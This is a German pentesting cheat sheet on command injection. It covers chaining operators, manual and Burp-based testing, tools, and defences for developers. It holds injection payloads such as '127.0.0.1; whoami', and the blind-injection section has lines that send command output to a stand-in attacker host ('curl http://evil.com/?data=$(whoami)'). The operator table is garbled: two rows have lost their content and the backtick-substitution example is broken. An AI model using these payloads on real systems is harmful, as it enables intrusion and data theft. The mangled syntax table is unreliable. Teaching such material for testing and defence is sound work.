Inhalt für web-pentesting/command-injection.md

# 💣 Command Injection

Command Injection (Befehlsinjektion) ist eine Schwachstelle, bei der ein Angreifer Systembefehle auf dem Server ausführen kann – meist durch unsichere Verarbeitung von Eingaben in Shell-Kommandos.

---

## 🧠 Grundlagen

### 🔍 Was passiert?
- Eingabe vom Nutzer wird direkt an ein Systemkommando übergeben
- z. B. über `ping`, `ls`, `cat`, `wget` usw.
- Wenn nicht sauber gefiltert → Ausführung von beliebigem Code möglich

### 💬 Beispiel
URL:  

http://example.com/ping?host=127.0.0.1


Server führt aus:
```bash
ping -c 1 127.0.0.1

Angreifer testet:

127.0.0.1; whoami

🔪 Injection-Techniken
🧱 1. Zeichen zur Befehlsverkettung
Zeichen	Funktion	Beispiel
;	Trennt zwei Befehle	127.0.0.1; whoami
&&	Führe nächsten nur aus, wenn vorheriger klappt	127.0.0.1 && whoami
`		`
`	`	Pipe
` `	Command Substitution	127.0.0.1; whoami``
$()	Ebenfalls Substitution	127.0.0.1; $(whoami)
🧪 Testmethoden
🔹 Manuell

    Eingabe: 127.0.0.1; whoami

    Rückgabe zeigt: www-data

🔹 Automatisiert mit Burp

    Repeater testen

    Intruder → Wordlist aus PayloadAllTheThings

🧰 Tools
Tool	Zweck
Burp Suite	Manuelle Tests / Fuzzing
ffuf	Fuzzing auf Parameter
Commix	Automatisiertes Ausnutzen
curl/wget	für Blind-Injection Tests
👁️ Blind Command Injection

Wenn keine direkte Rückmeldung:

    127.0.0.1; ping -c 3 evil.com

    127.0.0.1; curl http://evil.com/?data=$(whoami)

    Zeitverzögerung: sleep 5

🛡️ Schutzmaßnahmen (für Entwickler)

    Keine User-Eingabe in Systemkommandos verwenden!

    Wenn doch nötig:
    → Whitelist, Escaping, execve() statt system()

    Minimalrechte für Webprozesse (z. B. www-data)
